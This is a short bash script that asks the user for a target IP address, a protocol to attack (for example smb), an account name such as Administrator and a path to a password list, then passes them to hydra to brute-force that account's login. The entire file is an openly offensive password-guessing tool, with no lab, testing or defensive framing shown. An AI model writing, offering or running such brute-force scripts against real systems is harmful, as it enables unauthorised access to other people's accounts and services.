echo "Enter IP of Target"
read varIP

echo "Enter Protocol to attack eg smb"
read varPro

echo "Enter name of account eg Administrator"
read varAcc

echo "Enter path to Password file"
read varPass

hydra -l $varAcc -P $varPass $varIP $varPro
